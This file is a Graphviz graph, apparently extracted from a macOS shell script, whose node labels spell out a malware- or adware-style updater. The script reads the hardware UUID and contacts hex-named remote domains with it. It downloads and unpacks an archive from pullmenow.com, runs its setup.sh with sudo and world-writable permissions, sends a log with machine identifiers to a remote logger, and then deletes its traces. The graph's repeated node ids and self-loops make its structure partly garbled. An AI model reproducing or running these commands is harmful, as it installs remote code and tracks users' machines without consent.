digraph {
0 [label="updFile=/var/tmp/updText.txt "];
0 -> 0
2 [label="updFileError=/var/tmp/updTextError.txt "];
2 -> 4 [label="N,"];
4 [label="chmod 777 $updFile "];
4 -> 6 [label="N,"];
6 [label="chmod 777 $updFileError "];
6 -> 8 [label=";,"];
8 [label="echo $updFile "];
8 -> 188 [label=";,"];
188 [label="$updFile "];
188 -> 188
12 [label="echo $updFileError "];
12 -> 12
164 [label="$updFileError "];
164 -> 164
16 [label="br_mid=$(ioreg -rd1 -c IOPlatformExpertDevice | awk \'/IOPlatformUUID/ { split($0 "];
16 -> 16
18 [label="ioreg -rd1 -c IOPlatformExpertDevice "];
18 -> 20 [label="N,N,N,"];
20 [label="awk /IOPlatformUUID/ { split($0 "];
20 -> 22 [label="N,"];
22 [label="midFile=$(find /System/Library/Frameworks -type f -name \"*.uuid.plist\" -print0 | xargs -0 ls -tl | sort -n | tail -1 | awk \'{print $9}\ "];
22 -> 22
24 [label="find /System/Library/Frameworks -type f -name *.uuid.plist -print0 "];
24 -> 26 [label="N,N,N,"];
26 [label="xargs -0 ls -tl "];
26 -> 28 [label="N,"];
28 [label="sort -n "];
28 -> 98 [label="N,"];
98 [label="tail -1 "];
98 -> 32 [label="N,"];
32 [label="awk {print $9} "];
32 -> 34 [label="N,"];
34 [label="[ -e $midFile ] "];
34 -> 36 [label="SC,N,if,"];
36 [label="mid=$(echo \"$midFile\" | python -c \'import sys "];
36 -> 96 [label=";,then,"];
96 [label="echo $midFile "];
96 -> 40 [label="N,N,N,"];
40 [label="python -c import sys "];
40 -> 42 [label="N,"];
42 [label="echo mid: $mid. $updFile "];
42 -> 188 [label="\n,"];
188 [label="$updFile "];
188 -> 188
46 [label="get_pd_client_data=http://93a555685cc7443a8e1034efa1f18924.com/v/cld?mid=$br_mid&ct=pd "];
46 -> 48 [label="\n,fi,"];
48 [label="data=$(curl -s \"$get_pd_client_data\") "];
48 -> 50 [label="N,"];
50 [label="curl -s $get_pd_client_data "];
50 -> 52 [label="N,N,"];
52 [label="dc= "];
52 -> 52
54 [label=", word=\"channel=$(echo $dc | tr -d '[[:space:]]' | tr -cd 0-9)\" "];
54 -> 56 [label="N,"];
56 [label="echo $dc "];
56 -> 58 [label="N,N,N,"];
58 [label="tr -d [[:space:]] "];
58 -> 60 [label="N,"];
60 [label="tr -cd 0-9 "];
60 -> 62 [label="N,"];
62 [label="pdChannel=${dc:2} "];
62 -> 62
64 [label="echo DC: $dc $updFile "];
64 -> 188 [label="N,"];
188 [label="$updFile "];
188 -> 188
68 [label="click_id= "];
68 -> 68
70 [label="echo CLICK_ID: $click_id $updFile "];
70 -> 188 [label="N,"];
188 [label="$updFile "];
188 -> 188
74 [label="click_stamp= "];
74 -> 74
76 [label="echo CLICK_STAMP: $click_stamp $updFile "];
76 -> 188 [label="N,"];
188 [label="$updFile "];
188 -> 188
80 [label="id=$dc--$click_id___$click_stamp___$br_mid "];
80 -> 80
82 [label="echo Full ID: $id $updFile "];
82 -> 188 [label="N,"];
188 [label="$updFile "];
188 -> 188
86 [label="domain=http://aabcdebbb2226646b5bb8b11368342c830.com "];
86 -> 86
88 [label="pop_url=http://aabcdebbb2226646b5bb8b11368342c830.com/pp/fd?re=1&uid=[MACHINE_ID]&u=[CONTEXT_URL] "];
88 -> 90 [label="N,"];
90 [label="pop_delay=1 "];
90 -> 92 [label="N,"];
92 [label="[ $midFile ] "];
92 -> 94 [label="N,SC,N,if,"];
94 [label="frm=$(echo $midFile | tail -1 | awk -F \"/\" \'{print $5}\' | awk -F \".\" \'{print $1}\ "];
94 -> 96 [label=";,then,"];
96 [label="echo $midFile "];
96 -> 98 [label="N,N,N,"];
98 [label="tail -1 "];
98 -> 100 [label="N,"];
100 [label="awk -F / {print $5} "];
100 -> 102 [label="N,"];
102 [label="awk -F . {print $1} "];
102 -> 104 [label="N,"];
104 [label="mid_proc=false "];
104 -> 106 [label="fi,"];
106 [label="[ $frm ] "];
106 -> 108 [label="N,SC,N,if,"];
108 [label="ps -ef "];
108 -> 110 [label=";,then,SC,N,if,N,"];
110 [label="grep -v grep "];
110 -> 112 [label="N,"];
112 [label="grep -q $frm "];
112 -> 114 [label="N,"];
114 [label="mid_proc=true "];
114 -> 116 [label=";,then,"];
116 [label="echo midFile: $midFile. $updFile "];
116 -> 188 [label="N,fi,fi,"];
188 [label="$updFile "];
188 -> 188
120 [label="echo frm: $frm $updFile "];
120 -> 120
188 [label="$updFile "];
188 -> 188
124 [label="echo mid_proc: $mid_proc $updFile "];
124 -> 124
188 [label="$updFile "];
188 -> 188
128 [label="tgzfile=/var/tmp/up.tgz "];
128 -> 130 [label="N,(,),SC,{,"];
130 [label="updDir=/var/tmp/temp_updater_08-05-2016-8 "];
130 -> 132 [label="N,\n,"];
132 [label="updSh=/var/tmp/temp_updater_08-05-2016-8/setup.sh "];
132 -> 134 [label="N,\n,"];
134 [label="echo Starting Client Updater Script $updFile "];
134 -> 188 [label="N,\n,"];
188 [label="$updFile "];
188 -> 188
138 [label="/usr/bin/curl -s -L -o ${tgzfile} http://pullmenow.com/pd_files/client/temp_updater_08-05-2016-8.tgz "];
138 -> 140 [label="\n,"];
140 [label="tar -xzf ${tgzfile} -C /var/tmp/ "];
140 -> 142 [label="\n,"];
142 [label="[ -f ${updSh} ] "];
142 -> 144 [label="\n,SC,N,if,"];
144 [label="echo ${updSh} Exists $updFile "];
144 -> 188 [label=";,then,"];
188 [label="$updFile "];
188 -> 188
148 [label="sudo chmod 777 ${updSh} "];
148 -> 150 [label="\n,"];
150 [label="cd ${updDir} "];
150 -> 152 [label="\n,"];
152 [label="sudo ./setup.sh "];
152 -> 154 [label="\n,"];
154 [label="echo ${updSh} Not Exists $updFile "];
154 -> 188 [label="\n,else,"];
188 [label="$updFile "];
188 -> 188
158 [label="echo Installing pClt with logger $updFile "];
158 -> 188 [label="fi,\n,},"];
188 [label="$updFile "];
188 -> 188
162 [label="pClt $updFileError "];
162 -> 162
164 [label="$updFileError "];
164 -> 164
166 [label="sleep 10 "];
166 -> 168 [label=";,"];
168 [label="echo $(</var/tmp/updTextError.txt) $updFile "];
168 -> 168
172 [label="/var/tmp/updTextError.txt "];
172 -> 172 [label="N,"];
172 [label="/var/tmp/updTextError.txt "];
172 -> 172
188 [label="$updFile "];
188 -> 188
176 [label="sudo rm -rf ${tgzfile} "];
176 -> 176
178 [label="sudo rm -rf ${updDir} "];
178 -> 178
180 [label="eventType=Update Script Output "];
180 -> 180
182 [label="sleep 30 "];
182 -> 184 [label="N,"];
184 [label="curl --request POST http://93a555685cc7443a8e1034efa1f18924.com/v/pd-logger --data vs_mid=$mid --data br_mid=$br_mid --data-urlencode event_type=$eventType --data-urlencode event_data=$(<$updFile) "];
184 -> 184
188 [label="$updFile "];
188 -> 188 [label="N,"];
188 [label="$updFile "];
188 -> 188
190 [label="sleep 5 "];
190 -> 190
192 [label="rm -rf $updFile "];
192 -> 192
194 [label="rm -rf /var/tmp/updText2.txt "];
194 -> 194
}
